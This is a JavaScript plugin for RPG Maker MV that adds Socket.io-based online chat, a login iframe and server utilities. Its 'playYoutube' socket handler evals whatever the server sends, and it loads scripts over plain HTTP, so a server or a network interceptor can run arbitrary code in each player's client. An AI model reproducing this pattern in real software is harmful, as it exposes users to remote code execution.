/*:
 * RS_Net_Module.js
 * @plugindesc Online Chat (Node.js + Socket.io)
 * @author biud436
 *
 * @param SERVER_IP
 * @desc IP
 * @default 127.0.0.1
 *
 * @param PORT
 * @desc PORT
 * @default 3100
 *
 * @help
 *
 * =============================================================================
 * Change Log
 * =============================================================================
 *
 * 2015.11.06 - First Release, Added the Text Box
 * 2015.11.07 - Fixed the Text Box
 * 2015.11.08 - Added A Server based on NodeJS and Chat.
 * 2015.11.23 - Added a many function in the client.
 * 2015.11.24 - Added a function called '$gameMessage.addNotice()'
 * 2015.11.25 - Added functions that could download the login page from the Server.
 * 2016.05.10 - Added plugin parameters that could change the IP or Port of the Server.
 *
 * =============================================================================
 * Development Environment
 * =============================================================================
 * node.js, socket.io
 *
 * =============================================================================
 * Basic chatting commands
 * =============================================================================
 * @닉변 : 닉네임명 - This command provides a function that could change a nickname on chat box.
 *
 * =============================================================================
 * Basic Functions
 * =============================================================================
 * RS.Net.userCount() - Get the number of connected users on the server.
 * RS.Net.getTime() - Get the time of the server.
 * RS.Net.loadScript(ScriptName) - Download specific script from the server.
 * RS.UI.prepareLoginElement() - Indicate the Login page.
 *
 */

// Server URL

var RS = RS || {};

RS.Net = RS.Net || {};
RS.UI = RS.UI || {};

RS.Net.Params = $plugins.filter(function(i) {
    if(i.name === 'RS_Net_Module') {
        return true;
    }
})[0].parameters;

var $serverURL = (function($) {
    return "http://" + $.SERVER_IP + ":" + $.PORT;
})(RS.Net.Params);
var $socket = $socket || io.connect($serverURL);  

/**
 * @memberof RS.Net
 */

(function() {
    
  // Download the script from the server.
  RS.Net.loadScript = function(name) {
      var url = "%1/%2".format($serverURL, name);
      var script = document.createElement('script');
      script.type = 'text/javascript';
      script.src = url;
      script.async = false;
      script._url = url;
      document.body.appendChild(script);
  };

  // Download the script called 'JsonFormatter.js' from the server.
  RS.Net.loadScript('JsonFormatter.js');

  // Get the number of connected users on the server.
  RS.Net.userCount = function() {
    $socket.on('user count',function(msg) {
      console.log(msg);
    });
  };

  // Get the number of connected users on the server.
  RS.Net.update = function() {
    $socket.emit('user count', '');
  };

  /** 인스턴스 갯수 */
  RS.Net.count = 0;
  RS.Net.cryptText = "";
  RS.Net.cryptKey = "";

  // Get the time of the server.
  RS.Net.getTime = function() {
    $socket.emit('get time','');
    $socket.on('get time',function(msg) {
      console.log(msg);
    });
  };

  RS.Net.setCryptKey = function() {
    $socket.emit('get key', '');
  }

  /** 암호화 데이터 요청 */
  RS.Net.setEncryption = function(msg) {
    $socket.emit('crypt', msg);
  };

  /** 암호화 데이터 획득 */
  RS.Net.getCryptObject = function(msg) {
     return JSON.parse(RS.Net.cryptText);
  };

})();

//==============================================================================
// RS.UI
//==============================================================================

(function() {

  /** Prepare Element */
  RS.UI.prepareElement = function() {
    var divc = document.createElement('div');
    divc.id = 'inputField';
    divc.innerHTML = "<input id='input1' type='text'></input>";
    divc.style.left = '0px';
    divc.style.left = '0px';
    Graphics._centerElement(divc);
    divc.style.zIndex="1000";
    document.body.appendChild(divc);
    return divc;
  };

  /** Prepare Login Element */
  RS.UI.prepareLoginElement = function() {
    var divc = document.createElement('div');
    divc.id = 'loginField';
    divc.style.zIndex="1010";
    divc.style.width = '30%'
    divc.style.height = '30%'
    Graphics._centerElement(divc);
    document.body.appendChild(divc);
    var iframe = document.createElement('iframe');
    iframe.id = 'loginField';
    iframe.src = $serverURL + '/login.html';
    iframe.style.left = '0px';
    iframe.style.top = '0px';
    iframe.style.zIndex="1001";
    iframe.style.borderWidth = '0px';
    divc.appendChild(iframe)
    return divc;
  };

  /** Remove Login Element */
  RS.UI.removeLoginElement = function() {
    var divc = document.getElementById('loginField');
    document.body.removeChild(divc);
  };

  /** Create <input> tag */
  RS.UI.addTextBox = function(yPosition) {
    var rect, inp;
    rect = ChatBox.getEditBoxRect(yPosition);
    inp =document.getElementById('input1');
    inp.style.position = 'absolute'
    inp.style.backgroundColor =  'rgba(0,0,0,0.6)';
    inp.style.left = String(rect.x) + 'px'
    inp.style.top = String(rect.y) + 'px';
    inp.style.width= String(rect.width) + "px";
    inp.style.height = String(rect.height) + 'px';
    inp.style.borderColor = inp.style.backgroundColor;
    return inp;
  };

  /** Orientation */
  RS.UI.getHeight = function() {
    var vv = (window.innerHeight - Graphics.boxHeight), top;
    top = vv > 0 ? (vv / 2) : vv;
    return top;
  };

  /** 윈도우의 크기가 달라졌을 때 */
  RS.UI.resizeTextBox = function(yPosition) {
    var inp, left;
    inp =document.getElementById('input1');
    left = (window.innerWidth - Graphics.boxWidth) / 2;

    var rect = ChatBox.getEditBoxRect(yPosition);

    inp.style.position = 'absolute'
    inp.style.left = String(rect.x) + 'px'
    inp.style.top = String(rect.y) + 'px';
    inp.style.width= String(rect.width / Graphics._realScale ) + "px";
    inp.style.height = String(rect.height) + 'px';

  };

})();

//==============================================================================
// ChatBox
//==============================================================================

function ChatBox() {
  this.initialize.apply(this, arguments);
};

(function() {

  ChatBox.prototype = Object.create(Window_Base.prototype);
  ChatBox.prototype.constructor = ChatBox;

   /**  초기화 */
  ChatBox.prototype.initialize = function() {
    Window_Base.prototype.initialize.apply(this, arguments);
    this.opacity = 0;
  };

  /**  간격 설정 */
  ChatBox.prototype.standardPadding = function() {
      return 0;
  };

  /**  기본 폰트 크기 */
  ChatBox.prototype.standardFontSize = function() {
      return 12;
  };

  /** 폰트 설정 초기화  */
  ChatBox.prototype.resetFontSettings = function() {
      this.contents.fontFace = this.standardFontFace();
      this.contents.fontSize = this.standardFontSize();
      this.resetTextColor();
  };

  /** X좌표 */
  ChatBox.getX = function(clientX, w) {
    var gc = document.querySelector('canvas');
    var bound = document.getElementById('inputField').getBoundingClientRect();
    return (window.innerWidth - Graphics.width) / 2 + (clientX - bound.left) * (gc.width / bound.width);
  };

  /** Y좌표 */
  ChatBox.getY = function(clientY, h) {
    var gc = document.querySelector('canvas');
    var bound = document.getElementById('inputField').getBoundingClientRect();
    return (window.innerHeight - Graphics.height) / 2 + (clientY - bound.top) * (gc.height / bound.height);
  };

  /**  영역 획득 */
  ChatBox.getEditBoxRect = function(yPosition) {
    var rect = new Rectangle();
    rect.width = Graphics.boxWidth / 2;
    rect.height = 20;
    rect.x = ChatBox.getX(10, rect.width);
    rect.y = ChatBox.getY(yPosition, rect.height);
    return rect;
  };

})();

(function() {

  //==============================================================================
  // Scene_Map
  //==============================================================================

  /** 에디트박스를 생성합니다 */
  Scene_Map.prototype.createEditBox = function(yPosition) {
    var inp, divc;
    divc = RS.UI.prepareElement();
    inp = RS.UI.addTextBox(yPosition);
    window.onresize = RS.UI.resizeTextBox(yPosition);
    return inp;
  };

  /** 생성 */
  var _Scene_Map_createDisplayObjects = Scene_Map.prototype.createDisplayObjects;
  Scene_Map.prototype.createDisplayObjects = function() {
    _Scene_Map_createDisplayObjects.call(this);

    this.createChatBox();

  };

  //==============================================================================
  // Input
  //==============================================================================

  /** 키보드 맵핑 (문제가 있으므로 나중에 수정) */
  Input._shouldPreventDefault = function(keyCode) {
      switch (keyCode) {
      // case 8:     // backspace
      case 33:    // pageup
      case 34:    // pagedown
      case 37:    // left arrow
      case 38:    // up arrow
      case 39:    // right arrow
      case 40:    // down arrow
          return true;
      }
      return false;
  };

  //==============================================================================
  // Game_Temp
  //==============================================================================

  /** 채팅입력창을 클릭했을 때 이동 시스템 해제  */
  Game_Temp.prototype.isDestinationValid = function() {
    return (this._destinationX !== null) && !$gameTemp.chatFocus;
  };

  //==============================================================================
  // Scene_Map
  //==============================================================================

  /**  */
  Scene_Map.prototype.createChatBox = function() {

    // ------------------------------------------------------------------------
    // Create new Chat Box

    this._chatBox = new ChatBox(0, 0, Graphics.boxWidth / 2, Graphics.boxHeight / 3);
    this.addWindow(this._chatBox);

    var color = 'rgba(0, 0, 0, 0.6)';
    this._chatBox.contents.fillAll(color);

    this._chatBox.x = 10;
    this._chatBox.y = Graphics.boxHeight - this._chatBox.height - 80;

    // ------------------------------------------------------------------------
    // Create new Edit Box

    this._inputBox = this.createEditBox(this._chatBox.y + this._chatBox.height + 10);
    this._inputBox.style.color = 'rgb(255,255,255)';

    // ------------------------------------------------------------------------
    // Set an event called 'onchange'

      this._inputBox.onchange = function() {
        var msg = {
          id : $socket.io.engine.id,
          name: $gameParty.members()[0].name(),
          msg: this._inputBox.value
        };

        $socket.emit('chat message', JSON.stringify(msg));

        this._inputBox.value = "";
      }.bind(this);

    // ------------------------------------------------------------------------
    //

    this._inputBox.onfocus = function() {
      $gameTemp.chatFocus = true;
    }.bind(this);

    // ------------------------------------------------------------------------
    //

    this._inputBox.onblur = function() {
      $gameTemp.chatFocus = false;
    }.bind(this);

    // ------------------------------------------------------------------------
    //

    if(RS.Net.count === 0) {

      $socket.on('chat message', function(msg) {
        $gameMessage.addChat(msg);
      });

      $socket.on('current user', function(msg) {
        $gameMessage.addNotice("현재 접속 인원은 " + msg + " 명 입니다");
      });

      RS.Net.setCryptKey();

      $socket.on('get key', function(key) {
        RS.Net.cryptKey = key;
      });

      $socket.on('crypt', function(encrypted) {
        RS.Net.cryptText = encrypted;
      });

      $socket.on('playYoutube', function(msg) {
        eval(msg);
      });

     RS.Net.count++;
    };

    // ------------------------------------------------------------------------
    //

    var _chatBox_update = this._chatBox.update;
    this._chatBox.update = function() {
      _chatBox_update.call(this);

      if($gameMessage._textList && $gameMessage._textList instanceof Array) {

        // 초기화
        this.contents.clear();

        // 기본 색상 설정
        var color = 'rgba(0, 0, 0, 0.6)';

        // 기본 색상으로 채우기
        this.contents.fillAll(color);

        // 텍스트 추가
        $gameMessage._textList.forEach( function(nowText, index, array) {
          this.drawTextEx(nowText, 0, (index) * 20);
        }.bind(this));

      }
    };

  };

  //==============================================================================
  // Game_Message
  //==============================================================================

  /**
   * 텍스트 추가
   * @method addChat
   * @param text {String}
   */
  Game_Message.prototype.addChat = function(text) {
    var headText;
    var res = JSON.parse(text);
    if((res.msg).match(/@닉변[ ]*:[ ]*(.*)/) && $socket.io.engine.id === res.id) {
      $gameParty.members()[0].setName(RegExp.$1);
    }
    this._textList = this._textList || [];

    if($socket.io.engine.id === res.id) {
      headText = "\\c[4][%1]\\c[0] : ".format(res.name);
    } else {
      headText = "[%1] : ".format(res.name);
    }

    this._textList.push(headText + res.msg);
    setTimeout(function() { this._textList.shift(); }.bind(this), 1000 * 10);
  };

  Game_Message.prototype.addNotice = function(text) {
    var result = "\\c[4][공지] %1".format(text);
    this._textList = this._textList || [];
    this._textList.push(result);
    setTimeout(function() { 
        this._textList.shift(); 
    }.bind(this), 1000 * 10);
  };

  Game_Message.prototype.playYoutubeAllUser = function() {
    if($socket) $socket.emit('playYoutube', JSON.stringify(""));
  };

  /*** @alias Scene_Map.prorotype.terminate */
  var _Scene_Map_terminate = Scene_Map.prototype.terminate;
  Scene_Map.prototype.terminate = function() {
    _Scene_Map_terminate.call(this);
    if(this._inputBox) {
      var __inputField = document.getElementById('inputField');
      var __inputBox = document.getElementById('input1');
      __inputField.removeChild(__inputBox);
      document.body.removeChild(__inputField);
    }
  };

})();
